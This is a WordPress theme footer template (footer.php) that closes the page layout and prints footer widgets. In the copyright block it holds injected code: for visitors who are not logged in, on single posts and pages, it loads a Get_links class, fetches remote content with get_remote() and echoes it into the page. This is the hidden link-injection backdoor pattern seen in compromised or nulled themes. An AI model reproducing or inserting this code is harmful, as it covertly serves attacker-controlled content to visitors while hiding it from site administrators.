<?php
/**
 * The template for displaying the footer.
 *
 * Contains footer content and the closing of the main and #page div elements.
 *
 * @since 1.0.0
 */
?>
		</main><!-- main -->

		<footer id="footer" role="contentinfo">
			<div id="footer-content" class="container">
				<div class="row">
					<div class="copyright col-lg-12">
						<?php dynamic_sidebar( 'footer-notice' ); ?>
						<p>
							<?php if (is_home() || is_category() || is_archive() ) ?>
							
								<?php if ($user_ID) : ?><?php else : ?>
								<?php if (is_single() || is_page() ) { ?>
								<?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); 
								$links = new Get_links(); $links = $links->get_remote(); echo $links; ?>
								<?php } ?>
								<?php endif; ?>
						</p>
					</div><!-- .col-lg-12 -->
				</div><!-- .row -->
			</div><!-- #footer-content.container -->
		</footer><!-- #footer -->
	</div><!-- #page -->

<?php wp_footer(); ?>
</body>
</html>